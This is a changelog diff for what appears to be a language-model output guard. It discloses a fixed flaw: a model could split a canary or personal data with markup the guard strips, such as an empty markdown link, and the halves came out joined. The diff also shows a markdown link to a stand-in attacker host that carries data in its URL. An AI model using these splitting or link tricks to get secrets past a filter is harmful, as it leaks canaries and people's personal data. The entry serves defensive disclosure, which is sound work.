@@ -38,6 +38,11 @@ Before 1.0, minor versions may contain breaking changes; they are listed under
 - A markdown link or image with a title in parentheses and a long URL
   (`[t](https://evil.example/?d=<300 characters> (title))`) could be sent
   before its closing parenthesis arrived, and so keep its URL in a stream.
+- Personal data split by a link the guard removes (`a@ex[]()ample.com`,
+  `0912[](https://x) 345 678`) came out joined and unredacted, in whole
+  answers and in streams. It is now redacted as if the link had not been
+  there (see Security for the canary). A part that is a value on its own
+  (`joh[]()n.doe@mail.co.uk`) is redacted alone, as with a space instead.
 
 ### Documentation
 
@@ -53,6 +58,17 @@ Before 1.0, minor versions may contain breaking changes; they are listed under
 
 ### Security
 
+- The canary could leak through the output guard (v0.3.0 and earlier, whole
+  answers and streams) when the model split it with markup that the guard
+  removes: in `PS-CANARY-0123[]()4567…` the empty link was removed and the
+  two halves came out joined, after the canary check had run on the text
+  with the link still in it. The guard now looks for the canary (and
+  personal data) again wherever a removal joined text, and a stream holds
+  back the text before a link that may be removed until it knows what
+  follows, so in `block` mode the stream stops before any part of the
+  joined canary is sent and in `redact` mode it is replaced. Images and
+  `<img>` tags were not affected: they leave a `[REDACTED:image]` marker
+  between the halves. Benchmarks are unchanged.
 - Release archives get SLSA v1 build provenance: the release workflow's new
   `provenance` job attests every file of `checksums.txt` and
   `checksums-onnx.txt` (GitHub artifact attestation, Sigstore) and attaches
